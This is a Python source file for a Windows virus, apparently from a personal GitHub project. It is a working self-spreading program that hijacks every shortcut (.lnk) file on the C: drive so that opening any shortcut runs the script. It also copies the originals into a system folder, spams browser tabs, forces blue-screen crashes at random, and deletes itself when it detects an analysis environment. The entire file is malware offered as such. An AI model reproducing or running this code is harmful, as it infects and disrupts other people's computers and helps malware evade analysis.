from win32com.shell import shell, shellcon # type: ignore
from shared import *
import random as r
import uep as uep
import subprocess
import webbrowser
import pythoncom
import platform
import shutil
import sys
import os

STORE_PATH = r'C:\Windows\SysWOW64'
INFECT_PATH = 'C:\\'

if os.getlogin() == 'Omena0':
    INFECT_PATH = 'D:/--Documents/GitHub/virus/test'

def infect_dir(path):
    for i in os.listdir(path):
        full_path = os.path.join(path, i)
        if os.path.isdir(full_path):
            try: infect_dir(full_path)
            except Exception as e:
                print(e)
        elif i.endswith('.lnk'):
            shutil.copy(full_path, STORE_PATH)
            set_target(full_path, __file__, f'{STORE_PATH}/{i}')

if len(sys.argv) > 1:
    file = sys.argv[1]
    subprocess.run(file, shell=True)

    if not r.randrange(0,7):
        infect_dir(INFECT_PATH)

    if not r.randrange(0,2):
        for _ in range(r.randrange(0,20)):
            webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ',2)

    if not r.randrange(0,20): bsod()
    exit(1)

def set_target(filename,dest,args):
    shortcut = pythoncom.CoCreateInstance (
        shell.CLSID_ShellLink,
        None,
        pythoncom.CLSCTX_INPROC_SERVER,
        shell.IID_IShellLink
    )
    persist_file = shortcut.QueryInterface(pythoncom.IID_IPersistFile)
    persist_file.Load(filename)
    shortcut.SetPath(dest)
    shortcut.SetArguments(args)
    mydocs_path = shell.SHGetFolderPath(0, shellcon.CSIDL_PERSONAL, 0, 0)
    shortcut.SetWorkingDirectory(mydocs_path)
    persist_file.Save(filename, 0)

debug = True

set_priority()

if not is_admin():
    exit()

if platform.system() != 'Windows':
    exit()

if not debug and uep.check_all():
    os.remove(__file__)
    bsod()
    exit(1)

### ACTUAL PAYLOAD ###

infect_dir(INFECT_PATH)
